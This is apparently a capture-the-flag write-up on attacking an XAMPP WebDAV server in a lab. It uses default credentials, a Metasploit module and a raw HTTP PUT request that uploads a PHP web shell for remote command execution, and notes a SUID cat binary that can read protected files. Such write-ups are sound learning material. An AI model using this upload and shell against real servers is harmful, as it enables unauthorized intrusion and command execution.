searched on google webdav default creads and found: https://gist.github.com/kaiquepy/fd02275785ef7c8b6e6cb308654960d9

username wampp, password: xampp

got this hash from /webdav/passwd.dav

```
$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

though apparently it was same hash to above passwd and nothing special so deadend.

after searching google we got this vulnerability on xampp webdav by metasploit https://www.rapid7.com/db/modules/exploit/windows/http/xampp_webdav_upload_php/

although the php file was created metasploit wasn't able to create a session so i proxied the request to burpsuite to inspect what request is sent

```
msf exploit(windows/http/xampp_webdav_upload_php) > set Proxies http:127.0.0.1:8080
msf exploit(windows/http/xampp_webdav_upload_php) > set ReverseAllowProxy true
```

got the poc request

```http
PUT /webdav/shell1.php HTTP/1.1
Host: 10.48.165.110
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15
Authorization: Basic d2FtcHA6eGFtcHA=
Content-Length: 58
Connection: keep-alive

<?php
	    {
	        system($_GET['cmd']);
	    }
?>
```

got us the rce

## mistake i did

cat had the suid bit set instead of using to cat the flags i tried to crack passwd and shadow
